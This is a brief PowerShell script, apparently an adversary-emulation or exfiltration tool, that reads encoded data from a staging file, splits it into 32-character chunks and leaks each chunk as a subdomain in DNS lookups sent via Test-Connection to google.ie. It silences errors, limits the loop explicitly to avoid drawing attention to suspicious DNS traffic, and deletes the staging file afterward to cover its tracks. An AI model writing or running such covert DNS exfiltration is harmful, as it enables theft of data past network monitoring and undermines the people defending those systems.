
$ErrorActionPreference = 'SilentlyContinue'


$EncodedText = Get-Content -Path '.\Staging\Encoded.txt'
$array = $EncodedText -split '(.{32})' | ?{$_}  



# Loop capped at 8 iterations to avoid generating too much suspicious DNS traffic.
$numIterations = 8



for ($i = 0; $i -lt $numIterations; $i++)
{
    $Full_URL = $array[$i] + '.google.ie'
    Test-Connection $Full_URL -Count 1
}



Remove-Item -Path .\Staging\Encoded.txt
